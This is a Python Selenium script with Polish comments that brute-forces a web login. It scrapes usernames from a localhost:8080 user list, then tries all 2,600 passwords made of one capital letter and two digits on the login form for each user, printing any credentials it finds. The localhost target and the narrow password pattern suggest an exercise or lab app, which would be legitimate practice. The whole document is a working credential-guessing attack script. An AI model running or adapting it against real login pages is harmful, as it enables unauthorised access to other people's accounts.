from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.edge.service import Service as EdgeService
from webdriver_manager.microsoft import EdgeChromiumDriverManager
import time
import string

# Konfiguracja Selenium
driver = webdriver.Edge(service=EdgeService(EdgeChromiumDriverManager().install()))

def generate_passwords():
    for letter in string.ascii_uppercase:
        for number in range(100):
            yield f"{letter}{number:02}"

def get_usernames():
    driver.get("http://localhost:8080/users")
    time.sleep(1)  # Czekaj na załadowanie
    elements = driver.find_elements(By.CSS_SELECTOR, "ol#user-list li")
    return [el.text.strip() for el in elements]

def try_login(username, password):
    driver.get("http://localhost:8080/login")
    time.sleep(0.5)

    # Checkboxy, jeśli są obecne
    try:
        username_checkbox = driver.find_element(By.ID, "enable-username")
        password_checkbox = driver.find_element(By.ID, "enable-password")
        username_checkbox.click()
        password_checkbox.click()
    except:
        pass  # Jeśli nie ma checkboxów

    driver.find_element(By.ID, "username-input").clear()
    driver.find_element(By.ID, "password-input").clear()
    driver.find_element(By.ID, "username-input").send_keys(username)
    driver.find_element(By.ID, "password-input").send_keys(password)
    driver.find_element(By.ID, "login-button").click()
    time.sleep(0.3)

    message = driver.find_element(By.ID, "message-display").text.strip()
    return message == "Login successful"

def brute_force_users():
    users = get_usernames()
    for username in users:
        print(f"\n🔍 Trying user: {username}")
        for pwd in generate_passwords():
            if try_login(username, pwd):
                print(f"✅ Found password for '{username}': {pwd}")
                break
        else:
            print(f"❌ No valid password found for '{username}'")

try:
    brute_force_users()
finally:
    driver.quit()